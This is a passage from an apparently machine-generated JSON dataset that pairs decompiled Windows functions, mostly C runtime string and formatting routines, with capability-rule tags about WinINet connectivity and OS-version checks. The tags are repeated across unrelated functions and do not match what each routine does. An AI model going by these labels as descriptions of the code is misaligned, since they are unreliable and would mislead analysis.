        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401f32(int32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_ch == NULL) && (arg_10h != 0)) {\n        if (arg_8h != NULL) {\n            *arg_8h = 0;\n        }\n        return 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = -1;\n    }\n    if (0x7fffffff < arg_10h) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0x16;\n    }\n    fcn.004057e5(arg_18h);\n    uVar3 = 0;\n    if (*(var_14h + 8) == 0xfde9) {\n        var_8h = 0;\n        var_4h = 0;\n        iVar2 = fcn.00401357(arg_ch, arg_14h & 0xffff, &var_8h);\n        if (arg_8h != NULL) {\n            *arg_8h = iVar2;\n        }\n        if (4 < iVar2) {\n            puVar1 = fcn.004039a4();\n            uVar3 = *puVar1;\n        }\n        goto code_r0x004c28c9;\n    }\n    if (*(var_14h + 0xa8) == 0) {\n        if (arg_14h < 0x100) {\n            if (arg_ch != NULL) {\n                if (arg_10h == 0) goto code_r0x004c2945;\n                *arg_ch = arg_14h;\n            }\n            if (arg_8h != NULL) {\n                *arg_8h = 1;\n            }\n            goto code_r0x004c28c9;\n        }\n        if ((arg_ch != NULL) && (arg_10h != 0)) {\n            fcn.0040314d(arg_ch, 0, arg_10h);\n        }\n    }\n    else {\n        var_4h = 0;\n        iVar2 = fcn.00406550(*(var_14h + 8), 0, &arg_14h, 1, arg_ch, arg_10h, 0, &var_4h);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 0x7a) {\n                if ((arg_ch != NULL) && (arg_10h != 0)) {\n                    fcn.0040314d(arg_ch, 0, arg_10h);\n                }\ncode_r0x004c2945:\n                puVar1 = fcn.004039a4();\n                uVar3 = 0x22;\n                *puVar1 = 0x22;\n                fcn.00403751();\n                goto code_r0x004c28c9;\n            }\n        }\n        else if (var_4h == 0) {\n            if (arg_8h != NULL) {\n                *arg_8h = iVar2;\n            }\n            goto code_r0x004c28c9;\n        }\n    }\n    puVar1 = fcn.004039a4();\n    uVar3 = 0x2a;\n    *puVar1 = 0x2a;\ncode_r0x004c28c9:\n    if (var_ch != '\\0') {\n        *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n    }\n    return uVar3;\n}\n",
        "token_count": 907
    },
    "00401f4b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.00401f4b(uint32_t *param_1, char param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    uchar auVar8 [16];\n    char cVar10;\n    char cVar11;\n    char cVar12;\n    char cVar13;\n    char cVar14;\n    char cVar15;\n    char cVar16;\n    uchar auVar9 [16];\n    \n    if (*0x56ec4c != 0) {\n        auVar9 = pshuflw(ZEXT216(CONCAT11(param_2, param_2)), ZEXT216(CONCAT11(param_2, param_2)), 0);\n        uVar3 = -1 << (param_1 & 0xf);\n        pcVar7 = param_1 - (param_1 & 0xf);\n        while( true ) {\n            cVar2 = SUB161(auVar9, 0);\n            cVar10 = SUB161(auVar9 >> 8, 0);\n            cVar11 = SUB161(auVar9 >> 0x10, 0);\n            cVar12 = SUB161(auVar9 >> 0x18, 0);\n            cVar13 = SUB161(auVar9 >> 0x20, 0);\n            cVar14 = SUB161(auVar9 >> 0x28, 0);\n            cVar15 = SUB161(auVar9 >> 0x30, 0);\n            cVar16 = SUB161(auVar9 >> 0x38, 0);\n            auVar8 = CONCAT115(-(pcVar7[0xf] == '\\0'), \n                               CONCAT114(-(pcVar7[0xe] == '\\0'), \n                                         CONCAT113(-(pcVar7[0xd] == '\\0'), \n                                                   CONCAT112(-(pcVar7[0xc] == '\\0'), \n                                                             CONCAT111(-(pcVar7[0xb] == '\\0'), \n                                                                       CONCAT110(-(pcVar7[10] == '\\0'), \n                                                                                 CONCAT19(-(pcVar7[9] == '\\0'), \n                                                                                          CONCAT18(-(pcVar7[8] == '\\0')\n                                                                                                   , CONCAT17(-(pcVar7[7\n                                                            ] == '\\0'), \n                                                            CONCAT16(-(pcVar7[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar7[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar7[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar7[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar7[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar7[1] == '\\0'), -(*pcVar7 == '\\0'))))))))))))\n                                                            )))) |\n                     CONCAT115(-(pcVar7[0xf] == cVar16), \n                               CONCAT114(-(pcVar7[0xe] == cVar15), \n                                         CONCAT113(-(pcVar7[0xd] == cVar14), \n                                                   CONCAT112(-(pcVar7[0xc] == cVar13), \n                                                             CONCAT111(-(pcVar7[0xb] == cVar12), \n                                                                       CONCAT110(-(pcVar7[10] == cVar11), \n                                                                                 CONCAT19(-(pcVar7[9] == cVar10), \n                                                                                          CONCAT18(-(pcVar7[8] == cVar2)\n                                                                                                   , CONCAT17(-(pcVar7[7\n                                                            ] == cVar16), \n                                                            CONCAT16(-(pcVar7[6] == cVar15), \n                                                                     CONCAT15(-(pcVar7[5] == cVar14), \n                                                                              CONCAT14(-(pcVar7[4] == cVar13), \n                                                                                       CONCAT13(-(pcVar7[3] == cVar12), \n                                                                                                CONCAT12(-(pcVar7[2] ==\n                                                                                                          cVar11), \n                                                                                                         CONCAT11(-(\n                                                            pcVar7[1] == cVar10), -(*pcVar7 == cVar2))))))))))))))));\n            uVar3 = (SUB161(auVar8 >> 7, 0) & 1 | (SUB161(auVar8 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar8 >> 0x17, 0) & 1) << 2 | (SUB161(auVar8 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar8 >> 0x27, 0) & 1) << 4 | (SUB161(auVar8 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar8 >> 0x37, 0) & 1) << 6 | (SUB161(auVar8 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar8 >> 0x47, 0) & 1) << 8 | (SUB161(auVar8 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar8 >> 0x57, 0) & 1) << 10 | (SUB161(auVar8 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar8 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar8 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar8 >> 0x77, 0) & 1) << 0xe | SUB161(auVar8 >> 0x7f, 0) << 0xf) & uVar3;\n            if (uVar3 != 0) break;\n            uVar3 = 0xffffffff;\n            pcVar7 = pcVar7 + 0x10;\n        }\n        iVar1 = 0;\n        if (uVar3 != 0) {\n            for (; (uVar3 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n            }\n        }\n        puVar4 = pcVar7 + iVar1;\n        if (cVar2 != *puVar4) {\n            puVar4 = NULL;\n        }\n        return puVar4;\n    }\n    uVar3 = param_1 & 3;\n    while (uVar3 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar3 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar3 = *param_1;\n            uVar6 = uVar3 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar5 = uVar3 ^ 0xffffffff ^ uVar3 + 0x7efefeff;\n            puVar4 = param_1 + 1;\n            if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar4;\n            if ((uVar5 & 0x81010100) != 0) {\n                if ((uVar5 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar3 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar3 = *param_1;\n        if (uVar3 == param_2) {\n            return param_1;\n        }\n        if (uVar3 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar3 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar3 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar3 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar4;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 1966
    },
    "00401f82": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00401f82(int32_t param_1)\n\n{\n    uchar uVar1;\n    char cVar2;\n    \n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.0040551a(param_1 + 0x28);\n        return uVar1;\n    }\n    cVar2 = fcn.00401c08();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    cVar2 = fcn.00405128();\n    if ((cVar2 != '\\0') && (*(param_1 + 0x28) < 0)) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 170
    },
    "00401faf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401faf(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    *0x570064 = *0x570064 + 1;\n    uVar3 = 0x1000;\n    uVar2 = fcn.00404fd9(0x1000, 1);\n    arg_8h[1] = uVar2;\n    fcn.00406302(0);\n    puVar1 = arg_8h + 3;\n    if (arg_8h[1] == 0) {\n        LOCK();\n        *puVar1 = *puVar1 | 0x400;\n        arg_8h[1] = arg_8h + 5;\n        uVar3 = 2;\n    }\n    else {\n        LOCK();\n        *puVar1 = *puVar1 | 0x40;\n    }\n    arg_8h[6] = uVar3;\n    arg_8h[2] = 0;\n    *arg_8h = arg_8h[1];\n    return;\n}\n",
        "token_count": 252
    },
    "00401fc3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00401fc3(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        if (arg_14h != 0) {\n            var_1ch = &arg_14h;\n            var_8h = arg_14h;\n            var_18h = &arg_8h;\n            var_ch = arg_14h;\n            var_14h = &arg_ch;\n            var_10h = &arg_10h;\n            uVar2 = fcn.004aeee5(&var_ch, &var_1ch);\n            return uVar2;\n        }\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    return 0;\n}\n",
        "token_count": 293
    },
    "00401fcd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401fcd(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049e134;\n            param_1[7] = 8;\ncode_r0x0049dfff:\n            puStack8 = 0x49e004;\n            puVar6 = fcn.004039a4();\n            *puVar6 = 0x16;\n            puStack8 = 0x49e00f;\n            uVar7 = fcn.00403751();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049dfff;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049e134;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049e134;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049e134;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049e134;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049e134;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049e134;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049e134:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049e134;\n    param_1[7] = 7;\n    puStack8 = *0x56cca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x004a01d9:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a01dd:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a01e0:\n            cVar5 = fcn.00401587(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a0185:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a01e0;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x004a0199;\n                if (uVar9 < 0x45) goto code_r0x004a0369;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x004a0369;\n                    goto code_r0x004a016d;\n                }\n            }\ncode_r0x004a01e9:\n            cVar5 = fcn.00405146();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.004028c9();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x004a01e9;\n            if (uVar9 != 99) goto code_r0x004a0369;\ncode_r0x004a0199:\n            cVar5 = fcn.00406505(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00402388();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x004a01e9;\n            if (uVar9 == 0x69) goto code_r0x004a01d9;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.004063d9();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x004a0369;\n                cVar5 = fcn.00401e15();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x004a0369;\n                arg_ch_00 = 0;\n                goto code_r0x004a0185;\n            }\n            goto code_r0x004a01dd;\n        }\ncode_r0x004a016d:\n        cVar5 = fcn.00401870();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x004a0369;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x004a0274;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a0274:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.00402937(&stack0xfffffff0, arg_ch, param_1 + 6);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403f2b(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.004038b4(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x004a0369:\n    uVar7 = fcn.00403085(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2626
    },
    "00402031": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402031(ushort *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "00402068": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402068(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    int16_t *piVar4;\n    \n    if (arg_8h != NULL) {\n        piVar4 = arg_8h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        iVar3 = (piVar4 - (arg_8h + 1) >> 1) + 1;\n        arg_8h_00 = fcn.0040159b(iVar3 * 2);\n        if (arg_8h_00 != 0) {\n            iVar3 = fcn.004038dc(arg_8h_00, iVar3, arg_8h);\n            if (iVar3 == 0) {\n                return arg_8h_00;\n            }\n            fcn.004035f8(0, 0, 0, 0, 0);\n            pcVar2 = swi(3);\n            iVar3 = (*pcVar2)();\n            return iVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 284
    },
    "00402081": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402081(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.004053da(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f32(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.004053da(&var_ch, var_10h, param_1 + 0x18);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.00403085(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 396
    },
    "0040212b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040212b(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar1 = *(in_ECX + 4);\n    if (arg_8h < *(iVar1 + 0xc)) {\n        iVar2 = *(*(iVar1 + 8) + arg_8h * 4);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    else {\n        iVar2 = 0;\n    }\n    if (*(iVar1 + 0x14) != '\\0') {\n        iVar1 = fcn.00404ee4();\n        if (arg_8h < *(iVar1 + 0xc)) {\n            iVar2 = *(*(iVar1 + 8) + arg_8h * 4);\n        }\n        else {\n            iVar2 = 0;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 214
    },
    "00402153": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402153(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((*(param_1 + 0x1c) != 0) && (*(param_1 + 0x1c) != 7)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 106
    },
    "004021c1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.004021c1(uint32_t *arg_8h, ushort *arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if (arg_ch == NULL) {\n        if (arg_10h != 0) {\ncode_r0x004d22c7:\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            fcn.00403751();\n            return 0x16;\n        }\n    }\n    else if (arg_10h == 0) goto code_r0x004d22c7;\n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = 0;\n    }\n    fcn.004057e5(arg_1ch);\n    uVar3 = arg_10h;\n    if (arg_18h <= arg_10h) {\n        uVar3 = arg_18h;\n    }\n    if (uVar3 < 0x80000000) {\n        iVar2 = fcn.004d2059(arg_ch, arg_14h, uVar3, &var_ch);\n        if (iVar2 == -1) {\n            if (arg_ch != NULL) {\n                *arg_ch = 0;\n            }\n            puVar1 = fcn.004039a4();\n            uVar4 = *puVar1;\n            goto code_r0x004d233a;\n        }\n        uVar3 = iVar2 + 1;\n        if (arg_ch != NULL) {\n            if (arg_10h < uVar3) {\n                if (arg_18h != 0xffffffff) {\n                    *arg_ch = 0;\n                    puVar1 = fcn.004039a4();\n                    uVar4 = 0x22;\n                    goto code_r0x004d231b;\n                }\n                uVar4 = 0x50;\n                uVar3 = arg_10h;\n            }\n            arg_ch[uVar3 - 1] = 0;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = uVar3;\n        }\n    }\n    else {\n        puVar1 = fcn.004039a4();\n        uVar4 = 0x16;\ncode_r0x004d231b:\n        *puVar1 = uVar4;\n        fcn.00403751();\n    }\ncode_r0x004d233a:\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return uVar4;\n}\n",
        "token_count": 686
    },
    "00402207": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402207(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    code *pcVar3;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX[8] == 0) || (piVar1 = in_ECX[0xc],  *piVar1 < 1)) {\n        pcVar3 = *(*in_ECX + 0xc);\n        (**0x573000)(arg_8h);\n        arg_8h = (*pcVar3)();\n    }\n    else {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *in_ECX[8];\n        *in_ECX[8] = puVar2 + 1;\n        *puVar2 = arg_8h;\n    }\n    return arg_8h & 0xffff;\n}\n",
        "token_count": 199
    },
    "00402270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
